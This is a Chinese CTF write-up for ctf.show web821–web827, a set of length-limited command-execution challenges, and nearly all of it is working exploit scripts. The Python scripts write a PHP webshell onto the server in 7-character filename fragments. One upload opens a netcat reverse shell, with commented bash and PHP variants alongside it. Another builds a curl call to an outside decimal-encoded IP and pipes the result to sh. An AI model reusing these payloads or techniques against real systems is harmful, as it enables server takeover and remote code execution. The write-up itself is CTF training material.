[不想写了](https://blog.csdn.net/miuzzx/article/details/124038567?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165700916316781685398566%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165700916316781685398566&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-124038567-null-null.185^v2^tag_show&utm_term=%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF&spm=1018.2226.3001.4450)

##  web821

考点：限制长度的命令执行，7字符可写

https://www.cnblogs.com/-chenxs/p/11981586.html

https://xz.aliyun.com/t/2748#toc-2

https://miaotony.xyz/2021/01/31/CTF_web_CommandExecutionLimitedLength/

直接给本子：

```python
import  requests
import time
url="http://8498c2d2-871b-4db4-8a04-59f0fbda6b23.challenge.ctf.show/"

payload=[
">hp",
">2.p\\",
">d\\>\\",
">\\ -\\",
">e64\\",
">bas\\",
">7\\|\\",
">XSk\\",
">Fsx\\",
">dFV\\",
">kX0\\",
">bCg\\",
">XZh\\",
">AgZ\\",
">waH\\",
">PD9\\",
">o\\ \\",
">ech\\",
"ls -t>0",
". 0"
]

def write():
    for p in payload:
        data={
            'cmd':p.strip()
        }
        requests.post(url=url,data=data)
        print("[*]create"+p.strip())
        time.sleep(1)
def read():
    u=url+'2.php'
    p={
        '1':'system("ls /");echo z3eyond;'
    }
    r=requests.get(url=u,params=p)
    if 'z3eyond' in r.text:
        print(r.text)
def main():
    write()
    read()
if __name__=='__main__':
    main()
```

##  web822

考点：不能创建文件目录的7字符绕过

shell_exec，无回显，无法直接执行命令，同时不能创建目录，所有无法直接把数据带到本地，然后直接访问。

能不能数据外带？

但是存在7字符限制，要执行外带命令还是必须创建文件。

所以只能用创建临时文件，然后执行临时文件的方法，同时进行数据外带的方法。

直接上传文件到服务器，创建临时文件，然后马上执行`. /t*/*`

nc反弹shell才行

```php
#coding:utf-8
#author z3eyond
import requests
url="http://0009dfd0-bbbd-43b2-9a66-dac27a482d9f.challenge.ctf.show/"
#files={'file':'bash -i >& /dev/tcp/xxx/xxx 0>&1'}
files={'file':'nc  xxx 2345 -e /bin/sh'}
#files={'file':'''php -r '$sock=fsockopen("xxx",2345);exec("/bin/sh -i <&3 >&3 2>&3");' '''}
r= requests.post(url,files=files,data={'cmd':'. /t*/*'})
html = r.text
print(html)
```

##  web823，824

考点：还是一样的，限制条件

payload:

```php
payload=[
">grep",
">h",
"*>j",
"rm g*",
"rm h*",
">cat",
"*>>i",
"rm c*",
"rm j",
">cp",
"*"
]

```

payload:

```php
import  requests
import time
url="http://b3007df8-eb78-4d71-b13f-d0c3e5b8f2dd.challenge.ctf.show/"

payload=[
">grep",
">h",
"*>j",
"rm g*",
"rm h*",
">cat",
"*>>i",
"rm c*",
"rm j",
">cp",
"*"
]

def write():
    for p in payload:
        data={
            'cmd':p.strip()
        }
        requests.post(url=url,data=data)
        print("[*]create"+p.strip())
        time.sleep(1)
def main():
    write()
    read()
if __name__=='__main__':
    main()
```

利用grep来构造，最终调用index.php的命令

![image-20220705161343317](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220705161343317.png)



##  web825

考点：利用dir命令，空格需要换出`${IFS}`

构造原理类似

直接给本子

```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-05-06 13:25:41
# @Last Modified by:   h1xa
# @Last Modified time: 2022-05-10 20:55:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


import requests
import time

url = "http://eb893c73-86c3-449f-98fe-0f82d9212110.challenge.ctf.show/"

payload = [
'>sl',
'>kt-',
'>j\\>',
'>j\\#',
'>dir',
'*>v',
'>rev',
'*v>x',
'>php',
'>a.\\',
'>\\>\\',
'>-d\\',
'>\\ \\',
'>64\\',
'>se\\',
'>ba\\',
'>\\|\\',
'>4=\\',
'>Pz\\',
'>k7\\',
'>XS\\',
'>sx\\',
'>VF\\',
'>dF\\',
'>X0\\',
'>gk\\',
'>bC\\',
'>Zh\\',
'>ZX\\',
'>Ag\\',
'>aH\\',
'>9w\\',
'>PD\\',
'>S}\\',
'>IF\\',
'>{\\',
'>\\$\\',
'>ho\\',
'>ec\\',
'sh x',
'sh j'
]

def writeFile(payload):
	data={
	"cmd":payload
	}
	requests.post(url,data=data)

def run():
	for p in payload:
		writeFile(p.strip())
		print("[*] create "+p.strip())
		time.sleep(0.3)

def check():
	response = requests.get(url+"a.php")
	if response.status_code == requests.codes.ok:
		print("[*] Attack success!!!Webshell is "+url+"a.php")

def main():
	run()
	check()

if __name__ == '__main__':
	main()

```

## web826

外带数据

本子：

```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-05-06 13:25:41
# @Last Modified by:   h1xa
# @Last Modified time: 2022-05-10 20:55:58
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


import requests
import time

url = "http://d6373b16-848d-4656-9a30-d1fbb18d8678.challenge.ctf.show/"
#url="http://101.34.94.44/aaa/index.php"

payload = [
'>\\ \\',
'>-t\\',
'>\\>a',
'>ls\\',
'ls>v',
'>mv',
'>vt',
'*v*',
'>ls',
'l*>t',
'>cat',
'*t>z',

#这个地方的ip是用的10进制，因为用普通的ip地址存在多个点号。
#可以用这个网站转https://tool.520101.com/wangluo/jinzhizhuanhuan/
'>sh',
'>\\|\\',
'>00\\',
'>80\\',
'>\\:\\',
'>48\\',
'>11\\',
'>75\\',
'>96\\',
'>16\\',
'>\\ \\',
'>rl\\',
'>cu\\',

'sh z',
'sh a',
]
def writeFile(payload):
	data={
	"cmd":payload
	}
	requests.post(url,data=data)

def run():
	for p in payload:
		writeFile(p.strip())
		print("[*] create "+p.strip())
		time.sleep(1)

def check():
	response = requests.get(url+"1.php")
	if response.status_code == requests.codes.ok:
		print("[*] Attack success!!!Webshell is "+url+"1.php")

def main():
	run()
	check()

if __name__ == '__main__':
	main()

```

##  web827

不出网，只能写本地

```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-05-06 13:25:41
# @Last Modified by:   h1xa
# @Last Modified time: 2022-05-10 20:56:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


import requests
import time

url = "http://ab1290cc-c3f0-4ff2-b864-a4388d4331a6.challenge.ctf.show/"

payload = [
'>\\ \\',
'>-t\\',
'>\\>a',
'>ls\\',
'ls>v',
'>mv',
'>vt',
'*v*',
'>ls',
'l*>t',
'>cat',
'*t>z',

'>php',
'>a.\\',
'>\\>\\',
'>-d\\',
'>\\ \\',
'>64\\',
'>se\\',
'>ba\\',
'>\\|\\',
'>4=\\',
'>Pz\\',
'>k7\\',
'>XS\\',
'>sx\\',
'>VF\\',
'>dF\\',
'>X0\\',
'>gk\\',
'>bC\\',
'>Zh\\',
'>ZX\\',
'>Ag\\',
'>aH\\',
'>9w\\',
'>PD\\',
'>S}\\',
'>IF\\',
'>{\\',
'>\\$\\',
'>ho\\',
'>ec\\',


'sh z',
'sh a'
]

def writeFile(payload):
	data={
	"cmd":payload
	}
	requests.post(url,data=data)

def run():
	for p in payload:
		writeFile(p.strip())
		print("[*] create "+p.strip())
		time.sleep(1)

def check():
	response = requests.get(url+"a.php")
	if response.status_code == requests.codes.ok:
		print("[*] Attack success!!!Webshell is "+url+"a.php")

def main():
	run()
	check()

if __name__ == '__main__':
	main()

```

